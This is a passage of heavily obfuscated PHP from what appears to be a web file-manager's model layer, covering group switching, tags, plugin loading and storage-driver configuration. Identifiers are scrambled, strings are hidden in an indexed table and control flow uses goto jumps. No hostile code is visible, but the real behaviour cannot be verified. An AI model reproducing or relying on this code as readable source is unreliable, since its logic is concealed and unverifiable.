$Òˆ£Úœ˜ = $this->where(array($ĞÊË•»×[454] => $È¤Øœ¢î))->getField($ĞÊË•»×[32], !0); if (!$Òˆ£Úœ˜ || !in_array($Ñ¡Ù•—, $Òˆ£Úœ˜)) { return $Ñ¡Ù•—; } for ($¶ìÏ‚È = 1; $¶ìÏ‚È <= count($Òˆ£Úœ˜) + 1; $¶ìÏ‚È++) { $Ş¡ä‚”’ = $Ñ¡Ù•— . "\50{$¶ìÏ‚È}\x29"; if (!in_array($Ş¡ä‚”’, $Òˆ£Úœ˜)) { return $Ş¡ä‚”’; } } } public function groupSwitch($¼Üî“§ù, $«úÈªæÖ) { $ŠÛ¸¿™ı =& $_SERVER[–Ú¬çÁ]; $äçûã¢Ù = array($ŠÛ¸¿™ı[1864] => array($ŠÛ¸¿™ı[7], array($¼Üî“§ù, $«úÈªæÖ))); $ûá¨•…· = $this->where($äçûã¢Ù)->select(); $ûá¨•…· = array_to_keyvalue($ûá¨•…·, $ŠÛ¸¿™ı[1864]); if (!isset($ûá¨•…·[$¼Üî“§ù]) || !isset($ûá¨•…·[$«úÈªæÖ]) || $ûá¨•…·[$¼Üî“§ù][$ŠÛ¸¿™ı[180]] == 0) { return !1; } $äçûã¢Ù = array($ŠÛ¸¿™ı[1864] => $¼Üî“§ù); $ÄŠœÙ = Model($ŠÛ¸¿™ı[1954])->where($äçûã¢Ù)->select(); if (!$ÄŠœÙ) { $ÄŠœÙ = array(); } foreach ($ÄŠœÙ as $ÑÁ¡û€) { $“ı°Õ‡Â = $ÑÁ¡û€[$ŠÛ¸¿™ı[1666]]; $äçûã¢Ù = array($ŠÛ¸¿™ı[1666] => $“ı°Õ‡Â, $ŠÛ¸¿™ı[1864] => $«úÈªæÖ); $¶â¦Á™ = Model($ŠÛ¸¿™ı[1954])->where($äçûã¢Ù)->find(); if (!$¶â¦Á™) { $÷¦§ó‹Ê = array($«úÈªæÖ => $ÑÁ¡û€[$ŠÛ¸¿™ı[1968]]); Model($ŠÛ¸¿™ı[577])->userGroupAdd($“ı°Õ‡Â, $÷¦§ó‹Ê); } Model($ŠÛ¸¿™ı[577])->userGroupRemove($“ı°Õ‡Â, $¼Üî“§ù); } $äçûã¢Ù = array($ŠÛ¸¿™ı[178] => 2, $ŠÛ¸¿™ı[180] => 0, $ŠÛ¸¿™ı[462] => 1, $ŠÛ¸¿™ı[548] => array($ŠÛ¸¿™ı[7], array($¼Üî“§ù, $«úÈªæÖ))); $†¤™£²» = Model($ŠÛ¸¿™ı[845])->where($äçûã¢Ù)->field($ŠÛ¸¿™ı[1969])->select(); $†¤™£²» = array_to_keyvalue($†¤™£²», $ŠÛ¸¿™ı[548], $ŠÛ¸¿™ı[181]); $™ÖœŒ‹ù = !empty($†¤™£²»[$¼Üî“§ù]) ? $†¤™£²»[$¼Üî“§ù] : !1; if ($™ÖœŒ‹ù) { if (!$†¤™£²»[$«úÈªæÖ]) { $†¤™£²»[$«úÈªæÖ] = Model($ŠÛ¸¿™ı[845])->groupRootAdd($«úÈªæÖ); } $ÊØä“Ì = $†¤™£²»[$«úÈªæÖ]; $äçûã¢Ù = array($ŠÛ¸¿™ı[180] => $™ÖœŒ‹ù); $†¤™£²» = Model($ŠÛ¸¿™ı[845])->where($äçûã¢Ù)->field($ŠÛ¸¿™ı[1970])->select(); if (!$†¤™£²») { $†¤™£²» = array(); } Model($ŠÛ¸¿™ı[845])->moveClearAuth = !1; foreach ($†¤™£²» as $…ÁúÈ£â) { $¯“±Ï¹© = $…ÁúÈ£â[$ŠÛ¸¿™ı[462]] == $ŠÛ¸¿™ı[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ŠÛ¸¿™ı[845])->move($…ÁúÈ£â[$ŠÛ¸¿™ı[181]], $ÊØä“Ì, $¯“±Ï¹©); } Model($ŠÛ¸¿™ı[845])->moveClearAuth = !0; $äçûã¢Ù = array($ŠÛ¸¿™ı[178] => 2, $ŠÛ¸¿™ı[548] => $¼Üî“§ù); $šˆ­ìß¯ = array($ŠÛ¸¿™ı[548] => $«úÈªæÖ); Model($ŠÛ¸¿™ı[1971])->where($äçûã¢Ù)->save($šˆ­ìß¯); Model($ŠÛ¸¿™ı[1972])->where($äçûã¢Ù)->save($šˆ­ìß¯); } $this->_changeChildLevel($ûá¨•…·[$¼Üî“§ù], $ûá¨•…·[$«úÈªæÖ], !0); $this->where(array($ŠÛ¸¿™ı[180] => $¼Üî“§ù))->save(array($ŠÛ¸¿™ı[180] => $«úÈªæÖ)); $this->_clearChildrenCache($ûá¨•…·[$«úÈªæÖ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ËáÒ¨åï) { $¾ÍŸé¨ö =& $_SERVER[–Ú¬çÁ]; return array($¾ÍŸé¨ö[1973] => array($ËáÒ¨åï[0], $¾ÍŸé¨ö[1974]), $¾ÍŸé¨ö[1975] => array($ËáÒ¨åï[0], $¾ÍŸé¨ö[1976])); } protected function get($‡åı’Ş·) { $øØ¥¹”á =& $_SERVER[–Ú¬çÁ]; $ò©òâ = Model($øØ¥¹”á[564])->metaGet($‡åı’Ş·, $øØ¥¹”á[1977]); $ŞÉ¦š›ğ = json_decode($ò©òâ, !0); return $ŞÉ¦š›ğ ? $ŞÉ¦š›ğ : array($øØ¥¹”á[1978] => $øØ¥¹”á[88], $øØ¥¹”á[422] => array()); } protected function set($—àÄÂÒ›, $ó»»¦ıŸ) { $½Â¼ç©À =& $_SERVER[–Ú¬çÁ]; $ó»»¦ıŸ = $ó»»¦ıŸ ? $ó»»¦ıŸ : array($½Â¼ç©À[1978] => $½Â¼ç©À[88], $½Â¼ç©À[422] => array()); return Model($½Â¼ç©À[564])->metaSet($—àÄÂÒ›, $½Â¼ç©À[1977], json_encode($ó»»¦ıŸ)); } protected function getByTagID($§Ùëù¬, $Îğ»±) { $©»±¾òÛ =& $_SERVER[–Ú¬çÁ]; if (!$§Ùëù¬ || !$Îğ»±) { return !1; } if (!Model($©»±¾òÛ[564])->getInfoSimple($§Ùëù¬)) { return !1; } $ˆïÅÇé = $this->get($§Ùëù¬); if (!$ˆïÅÇé || !isset($ˆïÅÇé[$©»±¾òÛ[422]])) { return !1; } $¯íôú¢ë = array_find_by_field($ˆïÅÇé[$©»±¾òÛ[422]], $©»±¾òÛ[452], $Îğ»±); return is_array($¯íôú¢ë) ? $¯íôú¢ë : !1; } public function listSource($ƒ¼€¾ªå, $À‘ÃĞ—õ) { $Ô×ïÁı¼ =& $_SERVER[–Ú¬çÁ]; if ($À‘ÃĞ—õ && !is_array($À‘ÃĞ—õ)) { $À‘ÃĞ—õ = array($À‘ÃĞ—õ); } $ğ‚äã¶ = $this->listData($ƒ¼€¾ªå); $€Ì«ƒú† = array(); foreach ($ğ‚äã¶ as $è´«†˜¶) { $ ÀÎ´™ù = $è´«†˜¶[$Ô×ïÁı¼[84]]; if (!$ ÀÎ´™ù) { continue; } if (!isset($€Ì«ƒú†[$ ÀÎ´™ù])) { $€Ì«ƒú†[$ ÀÎ´™ù] = array(); } $€Ì«ƒú†[$ ÀÎ´™ù][] = $è´«†˜¶[$Ô×ïÁı¼[477]]; } $§Ëœ—àë = array(); foreach ($€Ì«ƒú† as $Å¯Á¹ıÚ => $®Å³—·) { $ºúßŠòÒ = !0; if (!$À‘ÃĞ—õ) { $§Ëœ—àë[] = $Å¯Á¹ıÚ; continue; } foreach ($À‘ÃĞ—õ as $ïşáõı) { if (!in_array($ïşáõı, $®Å³—·)) { $ºúßŠòÒ = !1; break; } } if ($ºúßŠòÒ) { $§Ëœ—àë[] = $Å¯Á¹ıÚ; } } if (!$§Ëœ—àë) { return array(); } $Ä™ëıÇ = array($Ô×ïÁı¼[468] => array($Ô×ïÁı¼[469], $§Ëœ—àë), $Ô×ïÁı¼[548] => $ƒ¼€¾ªå, $Ô×ïÁı¼[178] => SourceModel::TYPE_GROUP); $êøû„¥Ì = Model($Ô×ïÁı¼[1352])->listSource($Ä™ëıÇ); if (!$êøû„¥Ì || count($§Ëœ—àë) == $êøû„¥Ì[$Ô×ïÁı¼[419]][$Ô×ïÁı¼[420]]) { return $êøû„¥Ì; } $®Œ£¯Ò® = array(); $¨ö¶œ¢ã = array_to_keyvalue($êøû„¥Ì[$Ô×ïÁı¼[82]], $Ô×ïÁı¼[12], $Ô×ïÁı¼[181]); $­ÈÇÁ¦Ñ = array_to_keyvalue($êøû„¥Ì[$Ô×ïÁı¼[83]], $Ô×ïÁı¼[12], $Ô×ïÁı¼[181]); $©ÄÄÚÃ° = array_merge($­ÈÇÁ¦Ñ, $¨ö¶œ¢ã); foreach ($§Ëœ—àë as $ ÀÎ´™ù) { if (!in_array($ ÀÎ´™ù, $©ÄÄÚÃ°)) { $®Œ£¯Ò®[] = $ ÀÎ´™ù; } } if ($®Œ£¯Ò®) { $this->removeBySource($ƒ¼€¾ªå, $®Œ£¯Ò®); } return $êøû„¥Ì; } protected function listData($ƒĞèË¯³) { $’Ş‡Ğû÷ =& $_SERVER[–Ú¬çÁ]; $ş´ŒÀƒ· = array($’Ş‡Ğû÷[1657] => 0, $’Ş‡Ğû÷[535] => array($’Ş‡Ğû÷[1979], 0), $’Ş‡Ğû÷[473] => $’Ş‡Ğû÷[1980] . $ƒĞèË¯³); $úª…Ø† = $’Ş‡Ğû÷[1981]; $¼‘ùáœ = $this->field($úª…Ø†)->where($ş´ŒÀƒ·)->order($’Ş‡Ğû÷[1982])->select(); return $¼‘ùáœ ? $¼‘ùáœ : array(); } protected function addToTag($³÷§êëı, $ç“ÏĞèå, $½ş¼Ş ¼) { $¢½²’ñ =& $_SERVER[–Ú¬çÁ]; if (!$this->getByTagID($³÷§êëı, $½ş¼Ş ¼) || !$ç“ÏĞèå) { return !1; } if (!Model($¢½²’ñ[845])->pathInfo($ç“ÏĞèå)) { return !1; } $ğà·‰ó» = array($¢½²’ñ[1657] => 0, $¢½²’ñ[535] => $½ş¼Ş ¼, $¢½²’ñ[472] => $ç“ÏĞèå, $¢½²’ñ[473] => $¢½²’ñ[1983] . $³÷§êëı, $¢½²’ñ[471] => $¢½²’ñ[12], $¢½²’ñ[1868] => 0); if ($this->where($ğà·‰ó»)->find()) { return !1; } return $this->add($ğà·‰ó»); } protected function removeFromTag($âİòÁÏÑ, $×ü¾æØ…, $ßÛ¸ï„“) { $ØŠË·µ =& $_SERVER[–Ú¬çÁ]; if (!$this->getByTagID($âİòÁÏÑ, $ßÛ¸ï„“) || !$×ü¾æØ…) { return !1; } if (is_array($×ü¾æØ…)) { $×ü¾æØ… = array($ØŠË·µ[7], $×ü¾æØ…); } $àÊ©‚À´ = array($ØŠË·µ[1657] => 0, $ØŠË·µ[535] => $ßÛ¸ï„“, $ØŠË·µ[473] => $ØŠË·µ[1983] . $âİòÁÏÑ, $ØŠË·µ[472] => $×ü¾æØ…); return $this->where($àÊ©‚À´)->delete(); } protected function removeByTag($ÕÒØÕ¡, $í¤°¶šé) { $ØÇÉÔ¢Ñ =& $_SERVER[–Ú¬çÁ]; if (!$this->getByTagID($ÕÒØÕ¡, $í¤°¶šé)) { return !1; } $Áò›€³ = array($ØÇÉÔ¢Ñ[1657] => 0, $ØÇÉÔ¢Ñ[535] => $í¤°¶šé, $ØÇÉÔ¢Ñ[473] => $ØÇÉÔ¢Ñ[1983] . $ÕÒØÕ¡); return $this->where($Áò›€³)->delete(); } protected function removeBySource($¢Üá×Ğé, $Ñ»ÑœÓ) { $´“Ê˜îˆ =& $_SERVER[–Ú¬çÁ]; if (!$¢Üá×Ğé || !$Ñ»ÑœÓ) { return !1; } if (is_array($Ñ»ÑœÓ)) { $Ñ»ÑœÓ = array($´“Ê˜îˆ[7], $Ñ»ÑœÓ); } $šç§»ŒÈ = array($´“Ê˜îˆ[1657] => 0, $´“Ê˜îˆ[472] => $Ñ»ÑœÓ, $´“Ê˜îˆ[535] => array($´“Ê˜îˆ[1034], 0), $´“Ê˜îˆ[473] => $´“Ê˜îˆ[1983] . $¢Üá×Ğé); return $this->where($šç§»ŒÈ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\160\x6c\x75\147\x69\156\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\163\164\141\x74\165\163", "\x72\x65\147\x69\x65\163\x74", "\143\157\156\x66\151\x67"); public function loadList($ÖĞ½äâ– = false) { $¨Ïİ¶¤´ = array_to_keyvalue($this->listData(), $_SERVER[–Ú¬çÁ][32]); if ($ÖĞ½äâ–) { return $¨Ïİ¶¤´[$ÖĞ½äâ–]; } return $¨Ïİ¶¤´; } public function init() { $à¶èœ­ =& $_SERVER[–Ú¬çÁ]; Hook::trigger($à¶èœ­[1984]); $é™èÖ“š = $this->loadPluginList(); foreach ($é™èÖ“š as $Àš½ış => $É„ıÖÊª) { $€Ûªûàê = $this->appAllow($Àš½ış, $É„ıÖÊª); if (!$€Ûªûàê) { continue; } foreach ($É„ıÖÊª[$à¶èœ­[1985]] as $¹ä¼² => $ù£âı½š) { Hook::bind($¹ä¼², $ù£âı½š); } } Hook::trigger($à¶èœ­[1986]); Hook::trigger(ACTION); } public function appAllow($éÊÌÊ, $‹…Ìî¶, $Ûı“Üñ˜ = true) { $‘…¢Ÿİ  =& $_SERVER[–Ú¬çÁ]; $ø¤Öù›Û = PLUGIN_DIR . $éÊÌÊ . $‘…¢Ÿİ [1987]; if (!is_array($‹…Ìî¶) || !is_array($‹…Ìî¶[$‘…¢Ÿİ [1985]]) || $‹…Ìî¶[$‘…¢Ÿİ [770]] != 1 || !is_file($ø¤Öù›Û)) { return !1; } if ($GLOBALS[$‘…¢Ÿİ [546]] == 1) { if ($GLOBALS[$‘…¢Ÿİ [6]][$‘…¢Ÿİ [1988]] || !$GLOBALS[$‘…¢Ÿİ [6]][$‘…¢Ÿİ [1989]]) { return !0; } $¿ÔñøÜ÷ = explode($‘…¢Ÿİ [50], strtolower($GLOBALS[$‘…¢Ÿİ [6]][$‘…¢Ÿİ [1989]])); return in_array(strtolower($éÊÌÊ), $¿ÔñøÜ÷) ? !1 : !0; } if ($Ûı“Üñ˜ && !Action($‘…¢Ÿİ [1990])->checkAuth($éÊÌÊ)) { return !1; } return !0; } public function unInstall($Ûñ÷÷¬ê) { $ùáÂº¤ì =& $_SERVER[–Ú¬çÁ]; $ô¿¦–ê˜ = $this->loadList($Ûñ÷÷¬ê); if (file_exists(PLUGIN_DIR . $Ûñ÷÷¬ê)) { Hook::apply($Ûñ÷÷¬ê . $ùáÂº¤ì[1991]); } $this->remove($ô¿¦–ê˜[$ùáÂº¤ì[452]]); } public function changeStatus($„¼öÊÎ , $ÜâıÎ¼) { $É†›ú¬” =& $_SERVER[–Ú¬çÁ]; $Š†õ˜‘ù = $this->loadList($„¼öÊÎ ); if ($ÜâıÎ¼) { Hook::apply($„¼öÊÎ  . $É†›ú¬”[1992]); } $this->update($Š†õ˜‘ù[$É†›ú¬”[452]], array($É†›ú¬”[1993] => $ÜâıÎ¼)); } public function appRegist($‡„¤ì×Ş, $µ›ÔœÓ) { $Ç¶Üµëç =& $_SERVER[–Ú¬çÁ]; $¤¢»•¯ = $this->loadList($‡„¤ì×Ş); if ($¤¢»•¯) { $this->update($¤¢»•¯[$Ç¶Üµëç[452]], array($Ç¶Üµëç[1985] => $µ›ÔœÓ)); } else { $éå™í½Ø = array($Ç¶Üµëç[32] => $‡„¤ì×Ş, $Ç¶Üµëç[1985] => $µ›ÔœÓ, $Ç¶Üµëç[770] => 0, $Ç¶Üµëç[6] => $this->getConfigDefault($‡„¤ì×Ş)); $this->insert($éå™í½Ø); } } public function getConfigDefault($ğØ¢È—¿) { $ŸäÁ¿—Î =& $_SERVER[–Ú¬çÁ]; $‰«´òàŸ = array(); $ğşÜÎñÔ = $this->getPackageJson($ğØ¢È—¿); if (!$ğşÜÎñÔ && is_array($ğşÜÎñÔ[$ŸäÁ¿—Î[1994]])) { return $‰«´òàŸ; } foreach ($ğşÜÎñÔ[$ŸäÁ¿—Î[1994]] as $îïÎÍ¬ş => $ÔŞù•Áì) { if (!isset($ÔŞù•Áì[$ŸäÁ¿—Î[427]]) || isset($‰«´òàŸ[$îïÎÍ¬ş])) { continue; } $‰«´òàŸ[$îïÎÍ¬ş] = $ÔŞù•Áì[$ŸäÁ¿—Î[427]]; } return $‰«´òàŸ; } public function getPackageJson($ì£®ôíü) { return Hook::apply($ì£®ôíü . $_SERVER[–Ú¬çÁ][1995]); } public function getConfig($ã«¦’Öü, $ÁË‘Í = false) { $¾¦óö¬Õ =& $_SERVER[–Ú¬çÁ]; $àíüçë‰ = array(); $ŞÒÀóª = $this->loadList($ã«¦’Öü); if ($ŞÒÀóª && is_array($ŞÒÀóª[$¾¦óö¬Õ[6]])) { $àíüçë‰ = $ŞÒÀóª[$¾¦óö¬Õ[6]]; } if (!$àíüçë‰ || $ÁË‘Í) { $àíüçë‰ = $this->getConfigDefault($ã«¦’Öü); } return $àíüçë‰; } public function setConfig($êŒè“­, $àâ¦ îç = false) { $ÇçÖÌÊ =& $_SERVER[–Ú¬çÁ]; $çšã‡óå = $this->loadList($êŒè“­); if (!$çšã‡óå) { return !1; } $®¬°²Èî = $çšã‡óå[$ÇçÖÌÊ[6]]; if ($àâ¦ îç == !1) { $®¬°²Èî = array(); $àâ¦ îç = $this->getConfigDefault($êŒè“­); } foreach ($àâ¦ îç as $„œ…ê¢À => $ï¯ú¡ı) { $®¬°²Èî[$„œ…ê¢À] = is_string($ï¯ú¡ı) ? trim($ï¯ú¡ı) : $ï¯ú¡ı; } $this->update($çšã‡óå[$ÇçÖÌÊ[452]], array($ÇçÖÌÊ[6] => $®¬°²Èî)); } public function viewList() { $×àùÏÊÀ =& $_SERVER[–Ú¬çÁ]; $×å…¸ù£ = $this->loadList(); $this->pluginScan($×å…¸ù£); $×å…¸ù£ = $this->loadPluginList(); $¢ïµ¡ÂÔ = array(); foreach ($×å…¸ù£ as $…‰¾œŒÑ => $¼ÇÏ¶ò½) { unset($¼ÇÏ¶ò½[$×àùÏÊÀ[1985]], $¼ÇÏ¶ò½[$×àùÏÊÀ[6]]); $ˆå…¾¡˜ = PLUGIN_DIR . $¼ÇÏ¶ò½[$×àùÏÊÀ[32]] . $×àùÏÊÀ[1987]; if (!is_file($ˆå…¾¡˜)) { continue; } $êñ¯‘«¶ = Hook::apply($¼ÇÏ¶ò½[$×àùÏÊÀ[32]] . $×àùÏÊÀ[1995]); if (is_array($êñ¯‘«¶)) { $¢ïµ¡ÂÔ[$…‰¾œŒÑ] = array_merge($¼ÇÏ¶ò½, $êñ¯‘«¶); } } return $¢ïµ¡ÂÔ; } private function loadPluginList() { $µÀâı’† =& $_SERVER[–Ú¬çÁ]; $ÌĞàã© = $this->loadList(); if (strtolower(MOD) == $µÀâı’†[1996]) { return $ÌĞàã©; } $ù¬’¥×¦ = Hook::trigger($µÀâı’†[1997], $ÌĞàã©); if ($ÌĞàã© && !$ù¬’¥×¦) { die; } return $ù¬’¥×¦ ? $ù¬’¥×¦ : $ÌĞàã©; } private function pluginScan($­÷ä¯—) { $öŸ¥ù‚ú =& $_SERVER[–Ú¬çÁ]; recursion_dir(PLUGIN_DIR, $•é£¦Ï, $ª‘Š ßˆ, 0); foreach ($•é£¦Ï as $…½Û’±”) { $Ã…¹úÌñ = get_path_this($…½Û’±”); if (isset($­÷ä¯—[$Ã…¹úÌñ]) || !file_exists($…½Û’±” . $öŸ¥ù‚ú[1998]) || !file_exists($…½Û’±” . $öŸ¥ù‚ú[1987])) { continue; } Hook::apply($Ã…¹úÌñ . $öŸ¥ù‚ú[1992]); } } } goto AÄò¯íá™; BÚ½á©¾‘è: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\163\164\x6f\162\x61\147\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\172\x65\x4d\141\x78", "\x73\x79\163\x74\145\155", "\x64\x65\146\x61\165\154\x74", "\x64\162\x69\x76\x65\162", "\x63\x6f\x6e\x66\x69\x67"); public function listData($ŒÇƒ¦«º = false, $Ü¯×…› = "\155\157\144\151\x66\171\124\151\x6d\x65", $¢•ó’ïÓ = false) { $¡½¥í´” =& $_SERVER[–Ú¬çÁ]; $ úÁÉ©Ö = parent::listData($ŒÇƒ¦«º, $Ü¯×…›, $¢•ó’ïÓ); if ($ŒÇƒ¦«º) { return $ úÁÉ©Ö; } $ÔœĞµ… = $this->ioSizeUseGet(array_to_keyvalue($ úÁÉ©Ö, $¡½¥í´”[12], $¡½¥í´”[452])); foreach ($ úÁÉ©Ö as $¥¯¦¦óÜ => $Øú††¶ä) { unset($ úÁÉ©Ö[$¥¯¦¦óÜ][$¡½¥í´”[6]]); $ úÁÉ©Ö[$¥¯¦¦óÜ][$¡½¥í´”[1853]] = isset($ÔœĞµ…[$Øú††¶ä[$¡½¥í´”[452]]]) ? $ÔœĞµ…[$Øú††¶ä[$¡½¥í´”[452]]] : 0; } return $ úÁÉ©Ö; } public function ioSizeUseGet($–Õ±š—Ø) { $£‡Â§—Ñ =& $_SERVER[–Ú¬çÁ]; if (!$–Õ±š—Ø) { return array(); } $ÚÙ½£Ú = $£‡Â§—Ñ[2184] . implode($£‡Â§—Ñ[50], $–Õ±š—Ø); $øıè•±İ = Cache::get($ÚÙ½£Ú); if ($øıè•±İ) { return $øıè•±İ; } $æ³—Ø¦ö = array($£‡Â§—Ñ[837] => $£‡Â§—Ñ[452], $£‡Â§—Ñ[2185] => $£‡Â§—Ñ[76]); $™«šú³Û = array($£‡Â§—Ñ[837] => array($£‡Â§—Ñ[7], $–Õ±š—Ø)); $øıè•±İ = Model($£‡Â§—Ñ[809])->field($æ³—Ø¦ö)->where($™«šú³Û)->group($£‡Â§—Ñ[837])->select(); $øıè•±İ = array_to_keyvalue($øıè•±İ, $£‡Â§—Ñ[452], $£‡Â§—Ñ[76]); Cache::set($ÚÙ½£Ú, $øıè•±İ, 600); return $øıè•±İ; } public function getConfig($×“¸”°) { $ÑãêñÆË = parent::listData($×“¸”°); return json_decode($ÑãêñÆË[$_SERVER[–Ú¬çÁ][6]], !0); } public function update($ÇãÌ” , $€ó¬Ÿœ£) { $†Šã¸° =& $_SERVER[–Ú¬çÁ]; $İĞëÂ™ = $€ó¬Ÿœ£[$†Šã¸°[32]]; $˜ôÄÃ¯ = array_to_keyvalue(parent::listData(), $†Šã¸°[32]); if (isset($˜ôÄÃ¯[$İĞëÂ™]) && $˜ôÄÃ¯[$İĞëÂ™][$†Šã¸°[452]] != $ÇãÌ” ) { return !1; } $this->checkPwd($ÇãÌ” , $€ó¬Ÿœ£); if (isset($€ó¬Ÿœ£[$†Šã¸°[2186]]) && $€ó¬Ÿœ£[$†Šã¸°[2186]] == $†Šã¸°[88]) { $this->checkConfig($€ó¬Ÿœ£); } unset($€ó¬Ÿœ£[$†Šã¸°[2186]]); $Óß­àºç = parent::update($ÇãÌ” , $€ó¬Ÿœ£); if ($Óß­àºç && $€ó¬Ÿœ£[$†Šã¸°[37]]) { $àßê¼ÆÑ = 0; foreach ($˜ôÄÃ¯ as $ºâäÌöÉ) { if ($ºâäÌöÉ[$†Šã¸°[37]] && $ºâäÌöÉ[$†Šã¸°[452]] != $ÇãÌ” ) { $àßê¼ÆÑ = $ºâäÌöÉ[$†Šã¸°[452]]; parent::update($ºâäÌöÉ[$†Šã¸°[452]], array($†Šã¸°[37] => 0)); } } $this->updateBackup($ÇãÌ” , $àßê¼ÆÑ); } return $Óß­àºç; } public function add($‰µ³ÚÎÂ) { $íÍåÀÑó =& $_SERVER[–Ú¬çÁ]; $†ï¡ş°Ì = array_to_keyvalue(parent::listData(), $íÍåÀÑó[32]); if (isset($†ï¡ş°Ì[$‰µ³ÚÎÂ[$íÍåÀÑó[32]]])) { return !1; } $this->checkConfig($‰µ³ÚÎÂ); $ÅŒäˆĞæ = parent::insert($‰µ³ÚÎÂ); if ($ÅŒäˆĞæ && $‰µ³ÚÎÂ[$íÍåÀÑó[37]]) { foreach ($†ï¡ş°Ì as $ñ‹¢ĞÅå) { if ($ñ‹¢ĞÅå[$íÍåÀÑó[37]]) { parent::update($ñ‹¢ĞÅå[$íÍåÀÑó[452]], array($íÍåÀÑó[37] => 0)); } } } return $ÅŒäˆĞæ; } public function updateBackup($Ê´ÄôÖó, $¦¤›†Õô) { $ï™¨Äşµ =& $_SERVER[–Ú¬çÁ]; if (!$¦¤›†Õô) { return; } $›°ß¢¿Â = Model($ï™¨Äşµ[769])->config(); if ($›°ß¢¿Â[$ï™¨Äşµ[1636]] != $ï™¨Äşµ[88] || $›°ß¢¿Â[$ï™¨Äşµ[771]] != $¦¤›†Õô) { return; } $æÍ¤è¬¼ = Model($ï™¨Äşµ[790])->get($ï™¨Äşµ[800]); $æÍ¤è¬¼ = json_decode($æÍ¤è¬¼, !0); if (!$æÍ¤è¬¼) { return; } $æÍ¤è¬¼[$ï™¨Äşµ[771]] = $Ê´ÄôÖó; Model($ï™¨Äşµ[790])->set(array($ï™¨Äşµ[800] => $æÍ¤è¬¼)); } public function checkPwd($—Œùíƒ‘, &$˜Çı€¶Ù) { $Ğ ü‡§ƒ =& $_SERVER[–Ú¬çÁ]; if (empty($˜Çı€¶Ù[$Ğ ü‡§ƒ[6]])) { return; } $øÆŒÃÉ = json_decode($˜Çı€¶Ù[$Ğ ü‡§ƒ[6]], !0); $ü¤Æš  = $Ğ ü‡§ƒ[12]; $µ¤ğ‘‰é = array($Ğ ü‡§ƒ[2187], $Ğ ü‡§ƒ[2188], $Ğ ü‡§ƒ[909]); foreach ($µ¤ğ‘‰é as $â±áÆÌ) { if (isset($øÆŒÃÉ[$â±áÆÌ])) { $ü¤Æš  = $â±áÆÌ; break; } } if (!$ü¤Æš ) { return; } $ÑÀÄ´¼ = $this->getConfig($—Œùíƒ‘); $ÙÕ‹ºİœ = $ÑÀÄ´¼[$ü¤Æš ]; $”îˆí²³ = $øÆŒÃÉ[$ü¤Æš ]; if ($”îˆí²³ == str_repeat($Ğ ü‡§ƒ[213], strlen($ÙÕ‹ºİœ))) { $øÆŒÃÉ[$ü¤Æš ] = $ÙÕ‹ºİœ; $˜Çı€¶Ù[$Ğ ü‡§ƒ[6]] = json_encode($øÆŒÃÉ); } else { if ($”îˆí²³ != $ÙÕ‹ºİœ) { $˜Çı€¶Ù[$Ğ ü‡§ƒ[2186]] = $Ğ ü‡§ƒ[88]; } } } public function checkConfig(&$Ä¨¼ú¢ú, $ğü“—Ç¢ = false) { $Ì€ËÁ´ =& $_SERVER[–Ú¬çÁ]; $Ùâ¢¯ï’ = strtolower($Ä¨¼ú¢ú[$Ì€ËÁ´[95]]); $Ö±À¯€ì = json_decode($Ä¨¼ú¢ú[$Ì€ËÁ´[6]], !0); foreach ($Ö±À¯€ì as $àƒÎ  => $ÎÁğ•Ç») { if (is_string($ÎÁğ•Ç»)) { $Ö±À¯€ì[$àƒÎ ] = trim($ÎÁğ•Ç»); } } $Ö±À¯€ì[$Ì€ËÁ´[2189]] = rand_string(6); $–î€”ë = $GLOBALS[$Ì€ËÁ´[6]][$Ì€ËÁ´[89]][$Ì€ËÁ´[846]]; $¥‚ğŞ¸§ = isset($–î€”ë[$Ùâ¢¯ï’]) ? $–î€”ë[$Ùâ¢¯ï’] : ucfirst($Ùâ¢¯ï’); $Êåä’“€ = $Ì€ËÁ´[74] . $¥‚ğŞ¸§; if (!$¥‚ğŞ¸§ || !class_exists($Êåä’“€)) { if ($ğü“—Ç¢) { return LNG($Ì€ËÁ´[2190]); } write_log(array($Ì€ËÁ´[2191], $Ä¨¼ú¢ú, get_caller_info()), $Ì€ËÁ´[2192]); show_json(LNG($Ì€ËÁ´[2190]), !1, $Ä¨¼ú¢ú); } $şçúÜÖ¯ = new $Êåä’“€($Ö±À¯€ì); if (in_array($Ùâ¢¯ï’, $şçúÜÖ¯->objectDriver)) { if (!$şçúÜÖ¯->isBucketCors() && !$şçúÜÖ¯->setBucketCors()) { $ğÒí‘òí = LNG($Ì€ËÁ´[2193]); $ğÒí‘òí .= $Ì€ËÁ´[2194] . LNG($Ì€ËÁ´[2195]); if ($ğü“—Ç¢) { return $ğÒí‘òí; } show_json($ğÒí‘òí, !1); } } $‚ª™¶è¼ = rtrim($Ö±À¯€ì[$Ì€ËÁ´[1200]], $Ì€ËÁ´[8]) . $Ì€ËÁ´[8]; $Ùáû‹é¨ = $şçúÜÖ¯->getPath($‚ª™¶è¼ . $Ì€ËÁ´[1204]); if (!$şçúÜÖ¯->mkfile($Ùáû‹é¨)) { if ($ğü“—Ç¢) { return LNG($Ì€ËÁ´[2193]); } show_json(LNG($Ì€ËÁ´[2193]), !1); } $Ö±À¯€ì[$Ì€ËÁ´[1200]] = $‚ª™¶è¼; $Ä¨¼ú¢ú[$Ì€ËÁ´[6]] = json_encode($Ö±À¯€ì); $Ä¨¼ú¢ú[$Ì€ËÁ´[95]] = $¥‚ğŞ¸§; return !0; } public function driverListSystem() { $ì¤Ú·½ª =& $_SERVER[–Ú¬çÁ]; $”à´›«Â = parent::listData(); $™îù­ Ô = array(); foreach ($”à´›«Â as $Š¸íá†¦) { unset($Š¸íá†¦[$ì¤Ú·½ª[225]], $Š¸íá†¦[$ì¤Ú·½ª[85]]); $Š¸íá†¦[$ì¤Ú·½ª[6]] = json_decode($Š¸íá†¦[$ì¤Ú·½ª[6]], !0); $™îù­ Ô[] = $Š¸íá†¦; } return $™îù­ Ô; } public function defaultDriver() { $½‚¥ªÑ« =& $_SERVER[–Ú¬çÁ]; $éÊ”­ìé = parent::listData(); $¹Ã«áıš = array_filter_by_field($éÊ”­ìé, $½‚¥ªÑ«[37], 1); $¹Ã«áıš = 